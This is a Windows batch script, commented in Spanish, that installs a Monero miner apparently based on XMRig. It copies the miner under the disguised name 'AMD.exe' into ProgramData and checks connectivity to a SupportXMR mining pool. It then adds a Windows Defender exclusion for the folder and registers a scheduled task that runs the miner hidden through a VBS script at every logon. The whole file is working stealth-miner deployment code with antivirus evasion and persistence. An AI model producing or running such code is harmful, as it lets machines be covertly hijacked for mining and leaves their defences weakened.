@echo off
setlocal EnableExtensions
set "BASE=C:\ProgramData\XMR"

echo [*] Instalando en %BASE% ...
mkdir "%BASE%" >nul 2>&1

copy /y "AMD.exe"        "%BASE%" >nul
copy /y "config.json"      "%BASE%" >nul
copy /y "uninstall.bat"  "%BASE%" >nul
copy /y "ocultar.vbs"   "%BASE%" >nul

echo [*] Comprobando conectividad TLS 443 a SupportXMR...
powershell -NoProfile -Command "Try{ $r=Test-NetConnection 'pool.supportxmr.com' -Port 443; if($r.TcpTestSucceeded){'OK'}else{'FAIL'} }catch{'FAIL'}"

echo [*] (Opcional) Añadiendo exclusion en Defender para %BASE% ...
powershell -NoProfile -Command "try{Add-MpPreference -ExclusionPath '%BASE%'}catch{}" >nul 2>&1

echo [*] Creando tarea programada (oculta al iniciar sesion)...
schtasks /create /tn "XMRigBackground" ^
 /tr "wscript.exe ""%BASE%\ocultar.vbs""" ^
 /sc onlogon /rl lowest /f

echo [*] Lanzando ahora por primera vez (oculto)...
wscript.exe "%BASE%\ocultar.vbs"

echo [OK] Instalacion completada.
echo Log: %BASE%\log.txt
exit /b 0
pause
